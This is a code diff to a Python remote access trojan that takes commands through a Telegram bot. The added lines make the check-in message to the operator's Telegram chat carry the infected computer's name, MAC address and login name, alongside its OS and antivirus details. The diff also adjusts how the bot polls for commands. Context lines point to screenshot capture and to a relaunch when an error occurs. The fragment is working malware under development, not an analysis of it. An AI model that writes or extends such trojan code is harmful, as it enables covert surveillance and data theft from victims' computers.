@@ -1,7 +1,7 @@
-import sys
+import sys,platform
 import telebot
 import requests
-
+from getmac import get_mac_address as gma
 from RAT import *
 
 from Core.Settings.Organization    import *
@@ -279,7 +279,7 @@ while True:
 
   bot.send_message(TelegramChatID, 
   '\n*' + Online + '\n'
-  '\nPC » ' + os.getlogin() +
+  '\nPC » ' + ComputerName + '_' + gma() + '_' + os.getlogin() +
   '\nOS » ' + Windows() +
   '\n'
   '\nAV » ' + Antivirus[0] +
@@ -293,6 +293,7 @@ while True:
  else:
   print('[+] › Connected to api.telegram.org\n')
   break
+
 
 
 # Takes a screenshot
@@ -1258,7 +1259,9 @@ def Wallpapers(command):
 
 
 try:
- bot.polling(Argument)
+ 
+ #bot.polling(Argument)
+ bot.polling(none_stop=False, interval=0, timeout=20)
 except:
  os.startfile(CurrentPath)
  sys.exit()
